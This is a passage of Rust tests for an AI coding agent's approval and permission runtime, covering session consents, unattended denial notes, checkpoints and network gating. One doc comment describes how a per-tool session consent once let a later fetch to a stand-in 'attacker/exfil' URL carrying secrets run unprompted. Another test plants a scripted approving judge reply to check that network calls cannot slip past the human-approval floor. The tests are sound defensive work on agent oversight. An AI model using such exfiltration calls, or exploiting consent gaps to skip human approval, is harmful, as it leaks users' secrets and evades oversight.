        dispatch_turn("call_1", implementer),
        text_turn("ok"),
        dispatch_turn("call_2", networked),
        text_turn("ok"),
        dispatch_turn("call_3", implementer),
        text_turn("ok"),
    ]);
    let ran = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let mut registry = ToolRegistry::new();
    registry.register(BarrierAgentTool {
        barrier: Arc::new(tokio::sync::Barrier::new(1)),
        ran: Arc::clone(&ran),
    });
    let runtime = AgentRuntime::new(client, registry)
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Default));
    let parked_ids = |events: &[RuntimeEvent]| -> Vec<String> {
        events
            .iter()
            .filter_map(|event| match event {
                RuntimeEvent::ApprovalRequired { request, .. } => Some(request.call_id.clone()),
                _ => None,
            })
            .collect()
    };

    // Turn 1: the writing dispatch parks; the human answers "a".
    let mut rx = runtime.submit_user("dispatch a writer").await;
    assert_eq!(
        parked_ids(&drain(&mut rx).await),
        vec!["call_1".to_string()]
    );
    let mut rx = runtime
        .submit_approval(ApprovalDecision::ApprovedForSession)
        .await;
    let events = drain(&mut rx).await;
    assert_eq!(
        ran.load(SeqCst),
        1,
        "\"a\" still approves this one dispatch"
    );
    assert_eq!(finished_ids(&events), vec!["call_1".to_string()]);

    // Turn 2: a networked dispatch is its own approval point — it parks.
    let mut rx = runtime.submit_user("now go online").await;
    let events = drain(&mut rx).await;
    assert_eq!(
        parked_ids(&events),
        vec!["call_2".to_string()],
        "a networked dispatch must prompt even after \"a\" on a writing dispatch"
    );
    assert_eq!(
        ran.load(SeqCst),
        1,
        "nothing may run before the human answers"
    );
    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    assert_eq!(
        finished_ids(&drain(&mut rx).await),
        vec!["call_2".to_string()]
    );

    // Turn 3: even the same kind of dispatch parks again — "a" recorded nothing.
    let mut rx = runtime.submit_user("dispatch another writer").await;
    let events = drain(&mut rx).await;
    assert_eq!(
        parked_ids(&events),
        vec!["call_3".to_string()],
        "a sub-agent dispatch is never a standing consent"
    );
    assert_eq!(ran.load(SeqCst), 2);
}

/// A failed before-turn snapshot is a degradation, not the end of the turn:
/// `drive_turn` spawns the model loop right after it either way. It used to be
/// emitted as `Error`, which every consumer treats as terminal — the TUI
/// stopped observing without cancelling, so the turn ran on unobserved, tools
/// executing and an approval parking with nobody to answer. Now it is a
/// `Warning`, and the turn's own events follow it on the same channel.
#[cfg(unix)]
#[tokio::test]
async fn snapshot_failure_warns_and_the_turn_still_runs_observed() {
    use std::os::unix::fs::PermissionsExt;
    let workspace = tempfile::tempdir().unwrap();
    std::fs::write(workspace.path().join("keep.txt"), "v1").unwrap();
    let locked = workspace.path().join("locked");
    std::fs::create_dir(&locked).unwrap();
    std::fs::write(locked.join("inner.txt"), "hidden").unwrap();
    std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o000)).unwrap();

    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "hello".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let mut warnings = Vec::new();
    let runtime = AgentRuntime::new(client, ToolRegistry::new())
        .with_checkpoints(workspace.path(), &mut warnings);
    assert!(warnings.is_empty(), "{warnings:?}");
    let mut rx = runtime.submit_user("go").await;
    let events = drain(&mut rx).await;
    // Restore first so tempdir cleanup succeeds whatever the assertions say.
    std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o755)).unwrap();

    // Root ignores the permission bits: the snapshot then simply succeeds and
    // the failure path is not exercised on this host.
    if events
        .iter()
        .any(|event| matches!(event, RuntimeEvent::CheckpointCreated { .. }))
    {
        let ran_as_root = unsafe { libc::geteuid() } == 0;
        assert!(ran_as_root, "snapshot must fail on an unreadable subtree");
        return;
    }
    assert!(
        events.iter().any(|event| matches!(
            event,
            RuntimeEvent::Warning { message } if message.contains("before_turn")
        )),
        "the failed snapshot must be surfaced as a warning: {events:?}"
    );
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. })),
        "a degradation the turn survives must not be reported as terminal: {events:?}"
    );
    assert!(
        events.iter().any(|event| matches!(
            event,
            RuntimeEvent::AssistantDelta { text, .. } if text == "hello"
        )),
        "the model loop must still run on the observed channel: {events:?}"
    );
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::TurnFinished { .. })),
        "the turn must finish on the same channel: {events:?}"
    );
}

#[tokio::test]
async fn deny_path_records_denied_tool_message_and_continues() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("please echo").await;
    drain(&mut rx).await;

    let mut rx = runtime.submit_approval(ApprovalDecision::Denied).await;
    let events = drain(&mut rx).await;

    let denied = events.iter().find_map(|event| match event {
        RuntimeEvent::ToolCallFinished { result, .. } => Some(result),
        _ => None,
    });
    let denied = denied.expect("expected ToolResult on deny path");
    assert_eq!(denied.status, ToolResultStatus::Denied);

    let messages = runtime.session_messages().await;
    assert!(
        messages
            .iter()
            .any(|m| matches!(m.role, crate::message::Role::Tool) && m.content.contains("denied"))
    );
}

/// An unattended denial (the sub-agent auto-decider) carries its real reason,
/// which must replace the stock "denied by user" text end to end: no user saw
/// the prompt, and a child told that a human refused stops asking for things
/// the parent could re-dispatch.
#[tokio::test]
async fn unattended_denial_note_replaces_the_denied_by_user_text() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("please echo").await;
    drain(&mut rx).await;

    let note = "Denied by sub-agent policy (no user saw this request): test note.";
    let mut rx = runtime
        .submit_approval_with_denial_note(ApprovalDecision::Denied, Some(note.to_string()))
        .await;
    let events = drain(&mut rx).await;

    let denied = events
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::ToolCallFinished { result, .. } => Some(result),
            _ => None,
        })
        .expect("expected ToolResult on deny path");
    assert_eq!(denied.status, ToolResultStatus::Denied);
    assert_eq!(
        denied.content, note,
        "the note must replace the stock text verbatim"
    );

    let messages = runtime.session_messages().await;
    assert!(
        messages
            .iter()
            .any(|m| matches!(m.role, crate::message::Role::Tool) && m.content == note),
        "the recorded tool message must carry the note, not 'denied by user'"
    );
}

/// The note the UNATTENDED top-level runs hand that same plumbing.
///
/// `-p`, `serve --approval-mode autonomous` and the eval harness all deny
/// prompts with nobody in the loop, and all three used to submit a bare
/// `Denied` — so the model read "Tool call denied by user.", or, for a write
/// root, "User declined the write-root request for '<path>'. Do not request
/// this path again." Both are statements about a human who was never there,
/// and the sub-agent gate exists because that teaches the model the wrong
/// next move.
///
/// Root grants get their own text because their recovery differs: no
/// `auto_allow` entry and no permission mode pre-approves one (the gate
/// refuses them in every mode, `yolo` included), so the generic advice would
/// point at knobs that cannot help.
#[test]
fn the_unattended_note_tells_the_model_no_human_was_asked() {
    let request = |tool_name: &str| ApprovalRequest {
        call_id: "call_1".to_string(),
        tool_name: tool_name.to_string(),
        description: "d".to_string(),
        arguments: serde_json::json!({}),
        risk_level: crate::execution_policy::RiskLevel::High,
        requires_sandbox: false,
        network: false,
        justification: None,
        resolved_target: None,
        read_only: false,
        matched_rule: None,
        preview: None,
        safety_notes: Vec::new(),
    };

    let generic = unattended_denial_note(&request("shell"));
    let root_grant = unattended_denial_note(&request(crate::root_grant::REQUEST_WRITE_ROOT_TOOL));

    for note in [&generic, &root_grant] {
        assert!(
            note.contains("no user saw this request"),
            "an unattended denial must not read as a human refusal: {note}"
        );
        assert!(
            !note.contains("User declined"),
            "the stock human-refusal wording must not survive: {note}"
        );
    }
    // Each names the recovery that exists for it, and only that one.
    assert!(
        generic.contains("approval.auto_allow") && generic.contains("permission mode"),
        "the generic note must name the knobs that grant capability: {generic}"
    );
    assert!(
        root_grant.contains("--add-dir") && !root_grant.contains("approval.auto_allow"),
        "a write root is granted by --add-dir and by nothing else: {root_grant}"
    );
    assert_ne!(generic, root_grant);
}

#[tokio::test]
async fn plain_response_yields_assistant_message_and_finish() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "hello".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));
    let messages = runtime.session_messages().await;
    assert_eq!(messages.len(), 2);
    assert_eq!(messages[1].content, "hello");
    assert!(messages[1].tool_calls.is_empty());
}

#[tokio::test]
async fn plain_response_emits_structured_lifecycle_events() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ReasoningDelta {
            text: "thinking".to_string(),
        },
        AgentEvent::TextDelta {
            text: "hello".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    let turn_id = events
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::TurnStarted { turn_id, prompt } => {
                assert_eq!(prompt, "hi");
                Some(turn_id.clone())
            }
            _ => None,
        })
        .expect("turn started event");
    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::SessionUpdated {
            message_count: 1,
            current_turn_id: Some(id),
            ..
        } if id == &turn_id
    )));
    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::ReasoningDelta { turn_id: id, text }
            if id == &turn_id && text == "thinking"
    )));
    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::AssistantDelta { turn_id: id, text }
            if id == &turn_id && text == "hello"
    )));
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnFinished { turn_id: id, .. }) if id == &turn_id
    ));
}

#[tokio::test]
async fn tool_turn_emits_structured_tool_and_approval_events() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("please echo").await;
    let first = drain(&mut rx).await;
    let turn_id = first
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::TurnStarted { turn_id, .. } => Some(turn_id.clone()),
            _ => None,
        })
        .expect("turn started");

    assert!(first.iter().any(|event| matches!(
        event,
        RuntimeEvent::ToolCallUpdated {
            turn_id: id,
            tool_call_id,
            arguments_delta: Some(delta),
        } if id == &turn_id && tool_call_id.as_str() == "call_1" && delta.contains("hi")
    )));
    assert!(first.iter().any(|event| matches!(
        event,
        RuntimeEvent::ToolCallStarted {
            turn_id: id,
            tool_call_id,
            tool_name,
            ..
        } if id == &turn_id && tool_call_id.as_str() == "call_1" && tool_name == MockEchoTool::NAME
    )));
    assert!(first.iter().any(|event| matches!(
        event,
        RuntimeEvent::ApprovalRequired {
            turn_id: Some(id),
            tool_call_id: Some(tool_id),
            ..
        } if id == &turn_id && tool_id.as_str() == "call_1"
    )));

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let second = drain(&mut rx).await;
    assert!(matches!(
        second.first(),
        Some(RuntimeEvent::ApprovalResolved {
            turn_id: Some(id),
            tool_call_id,
            decision: ApprovalDecision::Approved,
        }) if id == &turn_id && tool_call_id.as_str() == "call_1"
    ));
    assert!(second.iter().any(|event| matches!(
        event,
        RuntimeEvent::ToolCallFinished {
            turn_id: Some(id),
            tool_call_id,
            result,
        } if id == &turn_id
            && tool_call_id.as_str() == "call_1"
            && result.status == ToolResultStatus::Success
    )));
}

#[tokio::test]
async fn tool_call_updates_reuse_stable_id_for_delta_fragments_without_id() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: ToolCallDelta {
                index: Some(0),
                id: Some("call_1".to_string()),
                call_type: Some("function".to_string()),
                function: Some(FunctionCallDelta {
                    name: Some(MockEchoTool::NAME.to_string()),
                    arguments: Some(r#"{"message":"hel"#.to_string()),
                }),
            },
        },
        AgentEvent::ToolCallDelta {
            delta: ToolCallDelta {
                index: Some(0),
                id: None,
                call_type: None,
                function: Some(FunctionCallDelta {
                    name: None,
                    arguments: Some(r#"lo"}"#.to_string()),
                }),
            },
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("please echo").await;
    let events = drain(&mut rx).await;
    let updated_ids = events
        .iter()
        .filter_map(|event| match event {
            RuntimeEvent::ToolCallUpdated { tool_call_id, .. } => Some(tool_call_id.as_str()),
            _ => None,
        })
        .collect::<Vec<_>>();

    assert_eq!(updated_ids, vec!["call_1", "call_1"]);
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::ApprovalRequired { .. })
    ));
}

#[tokio::test]
async fn invalid_tool_arguments_error_keeps_turn_id() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"unterminated""#),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("please echo").await;
    let events = drain(&mut rx).await;
    let turn_id = events
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::TurnStarted { turn_id, .. } => Some(turn_id.clone()),
            _ => None,
        })
        .expect("turn started");

    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::Error {
            turn_id: Some(id),
            ..
        } if id == &turn_id
    )));
}

#[test]
fn runtime_event_serializes_structured_turn_started() {
    let event = RuntimeEvent::TurnStarted {
        turn_id: TurnId("turn_test".to_string()),
        prompt: "hello".to_string(),
    };
    let json = serde_json::to_value(event).unwrap();
    assert_eq!(json["type"], "turn_started");
    assert_eq!(json["turn_id"], "turn_test");
    assert_eq!(json["prompt"], "hello");
}

#[tokio::test]
async fn turn_snapshots_emit_checkpoint_events() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "done".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default())
        .with_checkpoints(workspace.path(), &mut Vec::new());

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    let checkpoints: Vec<&str> = events
        .iter()
        .filter_map(|event| match event {
            RuntimeEvent::CheckpointCreated { label, .. } => Some(label.as_str()),
            _ => None,
        })
        .collect();
    // Exactly one snapshot per turn: before_turn is what rewind/restore key
    // off; an end-of-turn copy would duplicate the next turn's before_turn.
    assert_eq!(checkpoints, vec!["before_turn"]);
}

#[tokio::test]
async fn persistent_runtime_records_checkpoint_metadata() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "done".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap()
    .with_checkpoints(workspace.path(), &mut Vec::new());
    let session_id = runtime.session_id().await.expect("session id");

    let mut rx = runtime.submit_user("hi").await;
    drain(&mut rx).await;
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    assert!(
        record
            .checkpoints
            .iter()
            .any(|checkpoint| checkpoint.label == "before_turn")
    );
    assert!(
        record
            .checkpoints
            .iter()
            .all(|checkpoint| checkpoint.label != "after_turn"),
        "end-of-turn snapshots were removed as redundant with the next before_turn"
    );
}

/// Restore must refuse while a turn is in flight: rewinding the workspace under
/// a live turn lets its remaining tool writes land on top of the rollback.
#[tokio::test]
async fn restore_refuses_while_a_turn_is_in_progress() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "done".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap()
    .with_checkpoints(workspace.path(), &mut Vec::new());

    let (id, _) = runtime
        .checkpoints
        .as_ref()
        .unwrap()
        .snapshot_created("before_turn")
        .unwrap();

    // Restore is fine before any turn starts.
    assert!(
        runtime.restore_checkpoint(id.clone()).await.is_ok(),
        "restore must work when no turn is live"
    );

    // A turn is now live (bookkeeping started, loop not driven).
    runtime.begin_turn("do a thing").await;
    let refused = runtime.restore_checkpoint(id).await;
    assert!(
        refused.is_err(),
        "restore must refuse while a turn is in progress"
    );
    assert!(
        refused
            .unwrap_err()
            .to_string()
            .contains("turn is in progress"),
        "the refusal must name the reason"
    );
}

/// The session's checkpoint metadata is capped at the same number of entries
/// the disk store keeps. It used to grow without bound, so every session longer
/// than the cap carried records for snapshots `prune_old_snapshots` had already
/// deleted — and `hydrate_history` renders each of those on resume with a
/// `/restore <id>` hint that can only fail.
#[tokio::test]
async fn checkpoint_metadata_is_capped_like_the_snapshot_store() {
    let workspace = tempfile::tempdir().unwrap();
    let turn = || {
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ]
    };
    let client = ScriptedClient::new(vec![turn(), turn(), turn(), turn()]);
    let mut config = crate::config::AgentConfig::builtin();
    config.checkpoint_max_snapshots = 2;
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &config,
    )
    .unwrap()
    .with_checkpoints(workspace.path(), &mut Vec::new());
    let session_id = runtime.session_id().await.expect("session id");

    for prompt in ["one", "two", "three", "four"] {
        let mut rx = runtime.submit_user(prompt).await;
        drain(&mut rx).await;
    }
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    assert_eq!(
        record.checkpoints.len(),
        2,
        "metadata must track the snapshot cap, got {:?}",
        record
            .checkpoints
            .iter()
            .map(|checkpoint| checkpoint.id.0.as_str())
            .collect::<Vec<_>>()
    );
    // And it kept the NEWEST two — the ones still on disk.
    let on_disk = crate::checkpoint::CheckpointStore::new(workspace.path())
        .unwrap()
        .list()
        .unwrap();
    for checkpoint in &record.checkpoints {
        assert!(
            on_disk.contains(&checkpoint.id),
            "{} is recorded but no longer on disk",
            checkpoint.id.0
        );
    }
}

/// The prompt-prefix indicator must read "stable" in the case the rest of this
/// crate works to guarantee: appending a turn leaves every earlier wire message
/// byte-identical (`appending_entries_preserves_wire_prefix` pins that), so the
/// provider's cache keeps hitting. The old fingerprint hashed
/// `messages[..len - 1]` and compared turn N's against turn N+1's — two
/// different-length histories, never equal — so `Stable` was unreachable and
/// `/status` said "prefix changed" on every turn after the first.
#[tokio::test]
async fn an_appended_turn_reports_a_stable_prefix() {
    let turn = || {
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ]
    };
    let client = ScriptedClient::new(vec![turn(), turn(), turn()]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    let mut seen = Vec::new();
    for prompt in ["one", "two", "three"] {
        let mut rx = runtime.submit_user(prompt).await;
        for event in drain(&mut rx).await {
            if let RuntimeEvent::TurnFinished {
                telemetry: Some(telemetry),
                ..
            } = event
            {
                seen.push(telemetry.prefix_status);
            }
        }
    }
    assert_eq!(
        seen,
        vec![
            PrefixStatus::FirstTurn,
            PrefixStatus::Stable,
            PrefixStatus::Stable
        ]
    );
}

/// And it must still say `Changed` when the prefix really is rewritten.
/// Compaction is the one thing in the runtime that does that, and it no longer
/// needs a reset of its own to be reported honestly.
#[tokio::test]
async fn a_compacted_prefix_reports_changed() {
    let turn = || {
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ]
    };
    const TURNS: usize = 8;
    let client = ScriptedClient::new((0..TURNS).map(|_| turn()).collect());
    let mut config = crate::config::AgentConfig::builtin();
    // Low enough that compaction fires as soon as there are enough entries to
    // archive (`compact_entries` keeps a five-entry tail, so that takes a few
    // turns however low the threshold is).
    config.compaction_threshold = Some(1);
    let runtime = AgentRuntime::with_config(client, ToolRegistry::default(), config);

    let mut compacted_turns = 0usize;
    for index in 0..TURNS {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        let mut compacted = false;
        let mut status = None;
        for event in drain(&mut rx).await {
            match event {
                RuntimeEvent::CompactionApplied { .. } => compacted = true,
                RuntimeEvent::TurnFinished {
                    telemetry: Some(telemetry),
                    ..
                } => status = Some(telemetry.prefix_status),
                _ => {}
            }
        }
        if compacted {
            compacted_turns += 1;
            assert_eq!(
                status,
                Some(PrefixStatus::Changed),
                "turn {index} rewrote the prefix and must not report it as stable"
            );
        }
    }
    assert!(
        compacted_turns > 0,
        "the scenario never compacted, so it proves nothing"
    );
}

#[tokio::test]
async fn submit_approval_without_pending_emits_error() {
    let client = ScriptedClient::new(vec![]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let events = drain(&mut rx).await;
    assert!(matches!(events.first(), Some(RuntimeEvent::Error { .. })));
}

#[test]
fn truncate_tool_output_keeps_head_and_tail() {
    use crate::runtime::tool_result::truncate_tool_output;

    let small = "short output";
    assert_eq!(truncate_tool_output(small), small, "small output unchanged");

    let big = "A".repeat(5_000) + &"B".repeat(20_000) + &"C".repeat(5_000);
    let out = truncate_tool_output(&big);
    assert!(out.chars().count() < big.chars().count());
    assert!(out.starts_with("AAAA"));
    assert!(out.ends_with("CCCC"));
    assert!(out.contains("truncated"));
    // Head + tail + marker, far below the original 30k.
    assert!(out.chars().count() < 9_000);
}

/// A by-name session consent is offered exactly where the NAME is the risk.
///
/// This assertion used to read the other way for the network tools — "network
/// tools are the prime session-allow use case" — and the ergonomic half of that
/// is still true: repeated fetching is the most prompt-heavy thing the model
/// does. What changed is that the consent turned out to sit ABOVE the egress
/// floor written for exactly these calls (`is_network_tool` in
/// `auto_approval_granted`, reached only in the permission-mode layer, which
/// Layer 1 short-circuits). So one `a` on `fetch_url https://docs.rs/serde`
/// made every later `fetch_url http://attacker/exfil?d=<secrets>` run with no
/// prompt, in every mode — the same reasoning that already excluded sub-agent
/// dispatch, applied to a tool whose entire risk is one argument.
///
/// Withdrawn rather than narrowed, deliberately: the honest key for `fetch_url`
/// is the URL's origin, not its name, and that is a consent granularity this
/// codebase does not have yet. Users who really want blanket fetching keep the
/// `approval.auto_allow` list — explicit, persistent, and global-only, so a
/// repository cannot set it — which Layer 1 consults first.
#[test]
fn session_allow_excludes_the_tools_whose_risk_is_per_argument() {
    use crate::runtime::approval_flow::session_allowable;
    assert!(session_allowable("mock_echo"));
    assert!(session_allowable("write_file"));
    assert!(
        !session_allowable("fetch_url") && !session_allowable("web_search"),
        "a name-keyed consent cannot bound a destination chosen per call"
    );
    assert!(!session_allowable("shell"), "shell risk is per-argument");
    assert!(
        !session_allowable("job"),
        "a cancel-time consent must not blanket-approve action=start"
    );
}

#[tokio::test]
async fn session_approval_skips_future_prompts_for_same_tool() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"one"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_2", MockEchoTool::NAME, r#"{"message":"two"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("echo twice").await;
    let first = drain(&mut rx).await;
    assert!(matches!(
        first.last(),
        Some(RuntimeEvent::ApprovalRequired { .. })
    ));

    let mut rx = runtime
        .submit_approval(ApprovalDecision::ApprovedForSession)
        .await;
    let second = drain(&mut rx).await;

    // The second gated call of the same tool runs without prompting again,
    // leaving an ApprovalResolved audit event instead.
    assert!(
        second
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "session approval must suppress further prompts for the tool"
    );
    assert_eq!(finished_ids(&second), vec!["call_1", "call_2"]);
    assert!(second.iter().any(|event| matches!(
        event,
        RuntimeEvent::ApprovalResolved {
            tool_call_id,
            decision: ApprovalDecision::Approved,
            ..
        } if tool_call_id.as_str() == "call_2"
    )));
    assert!(matches!(
        second.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));
    assert_eq!(
        runtime.session_messages().await.last().unwrap().content,
        "done"
    );
}

/// The writer-side contract for `ExchangeResult::asked`, which is what a resumed
/// transcript reads to badge and fold exactly as the live one did.
///
/// Two gated calls of the same tool in one session, resolved two different ways:
/// the first is parked and answered by a human, the second is resolved by the
/// standing consent that answer created — WITHOUT a prompt, which is the whole
/// point of the consent. A UI never sees an `ApprovalRequired` for the second,
/// so it never badges it and folds it with the rest; the record has to say the
/// same thing, or `/resume` shows a session that never happened.
///
/// Nothing asserted this before, which is how the two could drift.
#[tokio::test]
async fn the_record_says_when_a_human_was_asked() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"one"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_2", MockEchoTool::NAME, r#"{"message":"two"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::with_mock_tools(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();
    let session_id = runtime.session_id().await.expect("session id");

    let mut rx = runtime.submit_user("echo twice").await;
    let parked = drain(&mut rx).await;
    assert!(
        matches!(parked.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "precondition: the first call parks"
    );
    // "Yes, and stop asking" — so the second call never reaches a human.
    let mut rx = runtime
        .submit_approval(ApprovalDecision::ApprovedForSession)
        .await;
    let resumed = drain(&mut rx).await;
    assert!(
        resumed
            .iter()
            .any(|event| matches!(event, RuntimeEvent::ApprovalResolved { .. })),
        "precondition: the standing consent leaves an audit event"
    );
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    // One assistant entry per model round, so each call is its own exchange.
    let exchanges: Vec<_> = record
        .entries
        .iter()
        .flat_map(|entry| match &entry.kind {
            crate::session_entry::EntryKind::Assistant { exchanges, .. } => exchanges.as_slice(),
            _ => &[],
        })
        .collect();
    assert_eq!(exchanges.len(), 2, "both calls were recorded");
    assert_eq!(
        exchanges[0].result.as_ref().expect("result").asked,
        Some(true),
        "the call a human answered says so — it must not be folded away on resume"
    );
    assert_eq!(
        exchanges[1].result.as_ref().expect("result").asked,
        Some(false),
        "the standing consent answered before anyone was asked, so this is quiet"
    );
}

/// Auto mode must park a network declaration for the human WITHOUT consulting
/// the judge: the scripted judge slot (which would approve) stays unconsumed,
/// so the turn ends at ApprovalRequired carrying the network badge.
#[tokio::test]
async fn auto_mode_parks_network_declaration_without_judging() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_1",
                    "shell",
                    r#"{"command":"git push origin main","network":true}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        // Judge bait: consumed (and approving) only if the network floor leaks
        // through to the classifier — the test then fails on the last event.
        vec![
            AgentEvent::TextDelta {
                text: r#"{"approve": true, "reason": "leaked"}"#.to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let mut registry = ToolRegistry::default();
    registry.register(FakeShellTool);
    let runtime = AgentRuntime::new(client, registry)
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Auto));

    let mut rx = runtime.submit_user("push it").await;
    let events = drain(&mut rx).await;
    let Some(RuntimeEvent::ApprovalRequired { request, .. }) = events.last() else {
        panic!("network declaration must park for the human, got {events:?}");
    };
    assert!(request.network, "the approval must carry the network badge");
}

/// Yolo grants a network declaration like everything else, and the grant
/// really reaches the sandbox policy of the executed call.
#[tokio::test]
async fn yolo_mode_auto_approves_network_declaration_with_grant() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_1",
                    "shell",
                    r#"{"command":"git push origin main","network":true}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
